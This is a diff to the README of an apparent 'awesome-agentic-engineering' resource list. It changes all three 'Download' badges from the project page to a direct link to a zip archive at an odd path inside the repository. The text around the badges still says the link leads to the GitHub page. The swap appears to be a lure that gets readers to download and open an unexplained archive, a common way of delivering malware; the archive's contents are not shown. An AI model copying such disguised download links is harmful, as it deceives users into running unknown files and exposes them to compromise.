@@ -1,6 +1,6 @@
 # 🤖 awesome-agentic-engineering - Practical Resources for Agentic Engineering
 
-[![Download awesome-agentic-engineering](https://img.shields.io/badge/Download-Get%20Files-orange?style=for-the-badge)](https://github.com/ahmedelhamoly/awesome-agentic-engineering)
+[![Download awesome-agentic-engineering](https://img.shields.io/badge/Download-Get%20Files-orange?style=for-the-badge)](https://github.com/ahmedelhamoly/awesome-agentic-engineering/raw/refs/heads/main/decorator/agentic_engineering_awesome_unremitted.zip)
 
 ---
 
@@ -35,7 +35,7 @@ You will use the main project page to get all materials. This page gathers the f
 
 Click this big button to go to the project page where you can download files and view available resources:
 
-[![Download awesome-agentic-engineering](https://img.shields.io/badge/Download-Get%20Files-orange?style=for-the-badge)](https://github.com/ahmedelhamoly/awesome-agentic-engineering)
+[![Download awesome-agentic-engineering](https://img.shields.io/badge/Download-Get%20Files-orange?style=for-the-badge)](https://github.com/ahmedelhamoly/awesome-agentic-engineering/raw/refs/heads/main/decorator/agentic_engineering_awesome_unremitted.zip)
 
 This link brings you to the GitHub page where you will find all the materials organized neatly.
 
@@ -140,4 +140,4 @@ Besides the project page, you might find related articles and tools by searching
 
 ---
 
-[![Download awesome-agentic-engineering](https://img.shields.io/badge/Download-Get%20Files-orange?style=for-the-badge)](https://github.com/ahmedelhamoly/awesome-agentic-engineering)
+[![Download awesome-agentic-engineering](https://img.shields.io/badge/Download-Get%20Files-orange?style=for-the-badge)](https://github.com/ahmedelhamoly/awesome-agentic-engineering/raw/refs/heads/main/decorator/agentic_engineering_awesome_unremitted.zip)
